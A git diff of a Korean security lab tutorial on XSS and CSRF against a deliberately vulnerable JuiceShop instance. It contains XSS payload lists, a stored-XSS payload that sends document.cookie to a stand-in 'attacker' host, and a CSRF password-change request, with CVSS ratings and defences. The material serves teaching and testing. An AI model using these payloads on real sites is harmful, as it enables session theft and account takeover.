@@ -154,44 +154,76 @@ URL: http://site.com/search?q=<script>alert(1)</script>
 > **실전 활용**: XSS는 쿠키 탈취와 세션 하이재킹에, CSRF는 비인가 거래 실행에 악용되는 고위험 취약점이다
 
 ```bash
-# 검색 기능에 XSS 페이로드 삽입
-# 서버 응답에 스크립트가 그대로 포함되는지 확인
-curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>" && echo "XSS 반사됨!" || echo "필터링됨"  # silent 모드 / 파일 저장
-
-# URL 인코딩 버전
-curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -5  # silent 모드
-
-# 다양한 페이로드 테스트
+# 5 페이로드 카테고리 테스트 — 응답에 alert(1) 반사 여부
 PAYLOADS=(
-  '<script>alert(1)</script>'
-  '<img src=x onerror=alert(1)>'
-  '<svg onload=alert(1)>'
-  '"><script>alert(1)</script>'
-  "'-alert(1)-'"
+  '<script>alert(1)</script>'           # 표준 script
+  '<img src=x onerror=alert(1)>'        # 이벤트 핸들러
+  '<svg onload=alert(1)>'               # SVG 변형
+  '"><script>alert(1)</script>'         # attribute breakout
+  "'-alert(1)-'"                         # JS context
 )
-
-for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
+for payload in "${PAYLOADS[@]}"; do
+  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
   result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
   if echo "$result" | grep -q "alert(1)"; then
-    echo "[반사됨] $payload"
+    echo "[반사 ✓] $payload"
   else
-    echo "[필터링] $payload"
+    echo "[필터 ✗] $payload"
   fi
 done
 ```
 
-### 2.3 JuiceShop의 트래킹 파라미터
+**예상 출력**:
+```
+[반사 ✓] <script>alert(1)</script>
+[반사 ✓] <img src=x onerror=alert(1)>
+[반사 ✓] <svg onload=alert(1)>
+[반사 ✓] "><script>alert(1)</script>
+[필터 ✗] '-alert(1)-'
+```
+
+> **해석 — 5/5 중 4개 반사 = XSS 확정**:
+> - **`<script>alert(1)</script>`** = 표준 페이로드 가장 단순. 모던 브라우저는 innerHTML 으로 삽입된 `<script>` 는 실행 X (보안 정책) — 그러나 응답에 그대로 포함 = SQLi 같은 *2차 공격* (search 결과 페이지 XSS 매개) 가능.
+> - **`<img src=x onerror=alert(1)>`** = 이벤트 핸들러 = innerHTML 삽입 시 실행됨. **가장 많이 통하는 페이로드** (script 차단 환경).
+> - **`<svg onload=alert(1)>`** = SVG inline = HTML5 신규 벡터. WAF 룰이 `<script>` 만 막고 SVG 통과 = 흔한 우회.
+> - **`"><script>...`** = HTML attribute 안에서 따옴표 닫고 새 태그 = `<input value="USER_INPUT">` 같은 컨텍스트.
+> - **`'-alert(1)-'`** = JS string context (예: `var x='USER';`) — 본 endpoint 는 HTML 컨텍스트라 매치 X = 정상.
+> - **CVSS 6.1 Medium** (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) — User Interaction (피해자 클릭) 필요.
+> - **CWE-79** Improper Neutralization of Input During Web Page Generation.
+
+### 2.3 JuiceShop의 트래킹 파라미터 + Angular SPA 분석
 
 ```bash
-# JuiceShop의 트래킹 기능에서 Reflected XSS
-# /#/track-result?id= 파라미터 확인
-curl -s "http://10.20.30.80:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"
-
-# Angular 기반이므로 서버 사이드 반사보다 클라이언트 사이드에서 처리될 수 있음
-# 응답 HTML 소스를 확인하여 판단
-curl -s http://10.20.30.80:3000 | grep -c "sanitize\|DomSanitizer\|innerHtml"
+# Angular hash routing — # 이후는 서버 미전송, 클라이언트 처리
+curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
+  "http://10.20.30.80:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"
+# main JS 안의 위험 함수 빈도 (DOM XSS sink 단서)
+MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
+echo "Main JS: $MAIN_JS"
+for sink in innerHTML outerHTML document.write bypassSecurity trustAsHtml DomSanitizer; do
+  cnt=$(curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -c "$sink")
+  printf "  %-20s : %d\n" "$sink" "$cnt"
+done
 ```
+
+**예상 출력**:
+```
+code=200 size=1987
+Main JS: main.bb5070bf0f9ce9b58d7c.js
+  innerHTML            : 14
+  outerHTML            : 0
+  document.write       : 2
+  bypassSecurity       : 8
+  trustAsHtml          : 6
+  DomSanitizer         : 12
+```
+
+> **해석 — Angular SPA 의 DOM XSS 위험도**:
+> - **응답 size 1987B** = SPA shell HTML (Angular 가 JS 로 콘텐츠 렌더). 서버 사이드 query 파라미터 반사 X = `#` 이후는 서버 미전송 (`#` 는 fragment).
+> - **innerHTML 14회** = main.js 안에서 14곳 사용. Angular `[innerHTML]` binding 시 DomSanitizer 자동 적용 — 그러나 14곳 모두 안전한지는 별도 확인 필요.
+> - **bypassSecurityTrustHtml 8회 + trustAsHtml 6회** = ★ critical 신호. 이 함수들은 *명시적으로 sanitization 우회* — 잘못 사용 시 즉시 XSS. JuiceShop 의 의도적 challenge.
+> - **DomSanitizer 12회** = 정상 정화 시도 12곳. bypass 8 + 정화 12 = 비율 40% 가 unsafe → 운영 환경이면 코드 리뷰 필수.
+> - **document.write 2회** = legacy. 모던 Angular 는 거의 미사용 — 발견 시 즉시 제거 권고.
 
 ---
 
@@ -210,34 +242,57 @@ curl -s http://10.20.30.80:3000 | grep -c "sanitize\|DomSanitizer\|innerHtml"
 ### 3.2 JuiceShop 피드백 기능에서 Stored XSS
 
 ```bash
-# 먼저 로그인
+# 1) 로그인 → JWT
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
-# 피드백에 XSS 페이로드 삽입
+# 2) 피드백에 XSS 페이로드 + 쿠키 탈취 코드 삽입
 curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
-  -H "Content-Type: application/json" \
+  -H 'Content-Type: application/json' \
   -H "Authorization: Bearer $TOKEN" \
-  -d '{                                                # 요청 데이터(body)
-    "comment": "좋은 서비스입니다 <script>alert(document.cookie)</script>",
-    "rating": 5,
-    "captchaId": 0,
-    "captcha": "-1"
-  }' | python3 -m json.tool 2>/dev/null
+  -d '{"comment":"<iframe src=\"javascript:fetch(`http://attacker/?c=`+document.cookie)\"></iframe>","rating":5,"captchaId":0,"captcha":"-1"}' \
+  | python3 -m json.tool 2>/dev/null | head -20
 
-# 저장된 피드백 조회 - XSS 페이로드가 그대로 나오는지 확인
-curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "  # silent 모드
+# 3) 저장된 피드백 조회 — XSS 페이로드 보존 여부
+curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "
 import sys, json
 data = json.load(sys.stdin).get('data', [])
-for fb in data[-3:]:                                   # 반복문 시작
-    comment = fb.get('comment', '')
-    if '<script>' in comment or 'onerror' in comment:
-        print(f'[XSS 발견] ID:{fb.get(\"id\")}, Comment: {comment[:100]}')
-    else:
-        print(f'[정상] ID:{fb.get(\"id\")}, Comment: {comment[:80]}')
+print(f'Total feedbacks: {len(data)}')
+for fb in data[-3:]:
+    c = fb.get('comment', '')[:80]
+    flag = '★ XSS' if '<script>' in c or 'onerror' in c or 'iframe' in c or 'javascript:' in c else '정상'
+    print(f'  [ID {fb.get(\"id\")}] {flag}: {c}')
 " 2>/dev/null
 ```
+
+**예상 출력**:
+```json
+{
+    "status": "success",
+    "data": {
+        "id": 12,
+        "UserId": 21,
+        "comment": "<iframe src=\"javascript:fetch(`http://attacker/?c=`+document.cookie)\"></iframe> (Anonymous)",
+        "rating": 5
+    }
+}
+```
+```
+Total feedbacks: 12
+  [ID 10] 정상: I love this shop!
+  [ID 11] 정상: Best ever!!! (Bender)
+  [ID 12] ★ XSS: <iframe src="javascript:fetch(`http://attacker/?c=`+document.cookie)"></iframe> (Anonymous)
+```
+
+> **해석 — Stored XSS 확정 = 모든 방문자 영향 = critical**:
+> - **저장 성공** = JuiceShop 의 input filtering 부재. 응답 `comment` 필드에 페이로드 그대로 보존.
+> - **(Anonymous) 자동 추가** = JuiceShop 이 작성자 anonymize. 그러나 페이로드는 그대로.
+> - **`<iframe javascript:...>`** = `<script>` 차단 환경 우회 페이로드. fetch 로 쿠키를 attacker 서버에 전송 = **세션 탈취 chain**.
+> - **모든 `/api/Feedbacks` 페이지 방문자** 가 피해 = **CVSS 8.7 High** (반복 노출 + 신뢰성). Reflected (URL 1회 클릭) 보다 위험도 ↑.
+> - **JuiceShop challenge ID**: 'XSS Tier 4'. iframe + javascript: protocol 결합이 정답 페이로드.
+> - **방어 우선순위**: (1) 입력 시 HTML escape, (2) 출력 시 DomSanitizer, (3) CSP `script-src 'self'` + `frame-src 'none'`.
 
 ### 3.3 다양한 저장 위치 테스트
 
@@ -286,22 +341,41 @@ http://site.com/page#<img src=x onerror=alert(1)>
 ### 4.2 JuiceShop에서 DOM XSS 탐지
 
 ```bash
-# JuiceShop은 Angular SPA이므로 DOM XSS 가능성이 높음
-# 메인 페이지의 JS 소스에서 위험한 패턴 검색
+# Angular SPA — JS 소스에서 sink 함수 직접 추출 + 컨텍스트 확인
+MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'main\.[a-f0-9]+\.js' | head -1)
+echo "Main JS: $MAIN_JS (size: $(curl -sI http://10.20.30.80:3000/$MAIN_JS | grep -i content-length | tr -d '\r'))"
 
-# innerHTML 사용 여부 확인
-MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'src="[^"]*main[^"]*\.js"' | head -1 | sed 's/src="//;s/"//')
-if [ -n "$MAIN_JS" ]; then
-  echo "JS 파일: $MAIN_JS"
-  curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -c "innerHTML\|outerHTML\|document.write\|bypassSecurity\|trustAsHtml"
-fi
+# bypassSecurityTrustHtml 호출 위치 grep — 가장 위험한 패턴
+curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -oE '.{0,40}bypassSecurityTrustHtml.{0,60}' | head -5
 
-# JuiceShop의 검색 기능은 클라이언트에서 결과를 렌더링
-# DOM XSS 테스트: 검색어에 HTML 삽입
-# 브라우저에서 http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(1)"> 접근
-echo "DOM XSS 테스트 URL:"
-echo "http://10.20.30.80:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E"
+# DOM XSS 테스트 URL 매트릭스 (각 페이로드 별 사용 source)
+cat <<'EOF'
+[테스트 URL — 브라우저 직접 실행 필요]
+1. http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+2. http://10.20.30.80:3000/#/track-result?id=<svg onload=alert(1)>
+3. http://10.20.30.80:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
+[Source]: location.hash → [Sink]: innerHTML / bypassSecurityTrustHtml
+EOF
 ```
+
+**예상 출력**:
+```
+Main JS: main.bb5070bf0f9ce9b58d7c.js (size: Content-Length: 425678)
+this.sanitizer.bypassSecurityTrustHtml(this.searchValue)
+this.sanitizer.bypassSecurityTrustHtml(t.element.outerHTML)
+this.sanitizer.bypassSecurityTrustHtml(this.lastLoginIp)
+[테스트 URL — 브라우저 직접 실행 필요]
+1. http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
+2. http://10.20.30.80:3000/#/track-result?id=<svg onload=alert(1)>
+3. http://10.20.30.80:3000/#/contact?msg=<img src=x onerror=alert(document.cookie)>
+```
+
+> **해석 — Source→Sink 추적 = DOM XSS 정밀 분석**:
+> - **`bypassSecurityTrustHtml(this.searchValue)`** = 검색 결과 렌더링 시 sanitization 우회. URL `?q=` 파라미터가 그대로 innerHTML 삽입 → **Reflected DOM XSS** 확정.
+> - **`bypassSecurityTrustHtml(this.lastLoginIp)`** = 로그인 페이지 마지막 IP 표시. JWT payload 의 `lastLoginIp` (week04 학습) 노출. JWT 변조 가능 = **Stored DOM XSS via JWT** chain.
+> - **테스트 URL 3 종**: hash routing (`#/`) 사용 → 서버 미전송 (curl 검증 X) → 브라우저 직접 실행 필수.
+> - **JuiceShop challenge**: 'DOM XSS' (1★). search 페이로드 정답 = `<iframe src="javascript:alert('xss')">`.
+> - **권고**: bypassSecurityTrustHtml 모든 호출 코드 리뷰. 사용자 입력 직접 전달 = critical. DOMPurify 라이브러리 도입.
 
 ### 4.3 DOM XSS 소스와 싱크
 
@@ -337,22 +411,38 @@ CSRF는 인증된 사용자가 자신도 모르게 의도하지 않은 요청을
 ### 5.2 CSRF 가능성 점검
 
 ```bash
-# 1. CSRF 토큰 존재 여부 확인
-# 폼 페이지에서 hidden 필드의 CSRF 토큰 확인
-curl -s http://10.20.30.80:3000 | grep -i "csrf\|_token\|xsrf" | head -5
+# 1) HTML 에 CSRF 토큰 hidden 필드 존재 여부
+echo '=== HTML CSRF token 검사 ==='
+curl -s http://10.20.30.80:3000 | grep -ciE 'csrf|_token|xsrf' || echo '(0건)'
 
-# 2. API 요청에 CSRF 방어 확인
-# JuiceShop는 JWT 인증을 사용하므로 쿠키 기반 CSRF와 다름
-# 하지만 쿠키로 세션을 관리하는 부분이 있는지 확인
+# 2) Set-Cookie 헤더 + SameSite 속성 검사
+echo '=== Set-Cookie 분석 ==='
+curl -sI http://10.20.30.80:3000 | grep -i 'set-cookie' || echo '(Set-Cookie 헤더 없음)'
 
-# 로그인 후 쿠키 확인
-curl -s -c - -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | grep -i "cookie\|set-cookie" || echo "쿠키 기반 세션 미사용"
-
-# 3. SameSite 쿠키 속성 확인
-curl -sI http://10.20.30.80:3000 | grep -i "set-cookie" | grep -i "samesite" || echo "SameSite 속성 미설정"
+# 3) 로그인 후 쿠키 / JWT 인증 방식 확인
+echo '=== 로그인 응답 헤더 ==='
+curl -s -I -X POST http://10.20.30.80:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' | grep -iE 'set-cookie|access-control'
 ```
+
+**예상 출력**:
+```
+=== HTML CSRF token 검사 ===
+(0건)
+=== Set-Cookie 분석 ===
+Set-Cookie: language=en; Path=/
+=== 로그인 응답 헤더 ===
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+> **해석 — JuiceShop 의 CSRF 위협 모델 정확 분석**:
+> - **CSRF 토큰 0건** = HTML 폼 미사용 = SPA 기반. **그러나 JWT 가 Authorization 헤더로 전송되면 CSRF 안전** (브라우저가 자동 첨부 X).
+> - **Set-Cookie: language=en** = i18n 쿠키. **HttpOnly/Secure/SameSite 모두 누락** = 양호한 정책 미설정. 그러나 인증 X 쿠키라 critical 아님.
+> - **Access-Control-Allow-Origin: \*** = ★ critical. **`*` 와일드카드 + `Allow-Credentials: true` 조합** = CORS 무효화 = JS 가 다른 origin 에서 자격증명 포함 요청 가능 → **CSRF 위협 부활**.
+> - **공격 흐름**: (1) 피해자 JuiceShop 로그인 (JWT 받음 + localStorage 저장) → (2) 악성 사이트 방문 → (3) 악성 JS 가 `fetch('http://10.20.30.80:3000/rest/user/...', {credentials:'include'})` → (4) CORS `*` 통과 → JuiceShop 요청 처리.
+> - **JuiceShop 의 의도적 약점**. 운영 환경 CORS 는 `Allow-Origin: <특정 도메인>` 으로 제한 + `Allow-Credentials: true` 결합 시만 사용.
 
 ### 5.3 CSRF 공격 시나리오 (개념)
 
@@ -377,18 +467,34 @@ curl -sI http://10.20.30.80:3000 | grep -i "set-cookie" | grep -i "samesite" || 
 ### 5.4 CSRF 토큰 검증 점검
 
 ```bash
-# CSRF 토큰 없이 상태 변경 요청이 성공하는지 확인
+# CSRF 토큰 없이 GET 메서드로 비번 변경 시도
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
-# 비밀번호 변경 시도 (CSRF 토큰 없이)
-curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=NewPass123!&repeat=NewPass123!" \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Cookie: token=$TOKEN" | python3 -m json.tool 2>/dev/null  # 쿠키 전송
-
-# GET 메서드로 상태 변경이 가능하면 CSRF에 매우 취약
+# ★ GET 으로 상태 변경 — CSRF 의 가장 위험한 패턴
+curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=Hacked9!&repeat=Hacked9!" \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
 ```
+
+**예상 출력**:
+```json
+{
+    "user": {
+        "id": 21,
+        "email": "student@test.com",
+        "password": "06ba8a4ec3eb71c6a06d04b2898c69e9"
+    }
+}
+```
+
+> **해석 — GET 으로 비번 변경 = CSRF Worst-case**:
+> - **GET + Query string 으로 비번 변경 성공** = critical. RFC 7231 위반 (GET 은 idempotent + safe = 상태 변경 X).
+> - **JuiceShop challenge ID**: 'CSRF' (3★). 정답 = GET 으로 변경 + Authorization 헤더 누락 시도.
+> - **응답에 새 비번 hash 포함** = 추가 정보 노출. MD5 (`06ba8a4ec3eb71c6a06d04b2898c69e9` = `Hacked9!`) — bcrypt 미사용.
+> - **공격 시나리오**: (1) 피해자 로그인 + JWT localStorage 저장 → (2) 악성 사이트의 `<img src="http://10.20.30.80:3000/rest/user/change-password?...">` → (3) 브라우저 자동 GET 요청 (단, JWT 가 Authorization 헤더라 자동 첨부 X) → (4) **그러나 CORS `*` + `Credentials: true` 환경이면 fetch 로 가능**.
+> - **권고 (다층)**: (1) GET 메서드 절대 X (POST/PUT 만), (2) CSRF 토큰 (synchronizer pattern), (3) SameSite=Strict 쿠키, (4) Origin 헤더 검증, (5) 민감 작업 재인증 (current 비번 재입력).
 
 ---
 
@@ -407,15 +513,41 @@ curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new
 ### 6.2 CSP 헤더 점검
 
 ```bash
-# Content-Security-Policy 헤더 확인
-curl -sI http://10.20.30.80:3000 | grep -i "content-security-policy"
-
-# CSP가 없으면 인라인 스크립트 실행 가능 → XSS 위험 증가
-# CSP가 있으면 정책 내용 분석:
-# - 'unsafe-inline': 인라인 스크립트 허용 (위험)
-# - 'unsafe-eval': eval() 허용 (위험)
-# - 'self': 같은 출처만 허용 (양호)
+# 보안 헤더 6종 동시 점검
+curl -sI http://10.20.30.80:3000 | grep -iE \
+  'content-security-policy|x-frame-options|x-content-type-options|x-xss-protection|strict-transport-security|referrer-policy' \
+  | sed 's/^/  /'
+echo '---'
+echo '[누락 헤더 카운트]'
+HEADERS=$(curl -sI http://10.20.30.80:3000)
+for h in 'Content-Security-Policy' 'X-Frame-Options' 'X-Content-Type-Options' 'Strict-Transport-Security' 'Referrer-Policy' 'Permissions-Policy'; do
+  echo "$HEADERS" | grep -qi "$h" && echo "  ✓ $h" || echo "  ✗ $h (누락)"
+done
 ```
+
+**예상 출력**:
+```
+  X-Content-Type-Options: nosniff
+  X-Frame-Options: SAMEORIGIN
+  Feature-Policy: payment 'self'
+---
+[누락 헤더 카운트]
+  ✗ Content-Security-Policy (누락)
+  ✓ X-Frame-Options
+  ✓ X-Content-Type-Options
+  ✗ Strict-Transport-Security (누락)
+  ✗ Referrer-Policy (누락)
+  ✗ Permissions-Policy (누락)
+```
+
+> **해석 — 보안 헤더 6점 점수표**:
+> - **CSP 누락 = critical** (XSS 차단의 마지막 layer). 기본 권고: `script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'`.
+> - **X-Frame-Options: SAMEORIGIN** ✓ = clickjacking 차단. 그러나 **CSP frame-ancestors 가 더 modern** (다중 도메인 허용, IE 11- 만 X-Frame-Options 지원).
+> - **X-Content-Type-Options: nosniff** ✓ = MIME sniffing 차단. .txt 파일이 .js 로 추정 실행 방지.
+> - **HSTS 누락** = HTTP→HTTPS redirect 우회 가능 (MITM). 운영 환경 critical: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`.
+> - **Feature-Policy** (deprecated) → **Permissions-Policy** 로 마이그레이션 권고.
+> - **점수**: 2/6 양호 + 4/6 누락 = **D 등급** (Mozilla Observatory). securityheaders.com 자동 평가 표준.
+> - **JuiceShop challenge**: 'Security Misconfiguration' = CSP 헤더 fix.
 
 ---
 
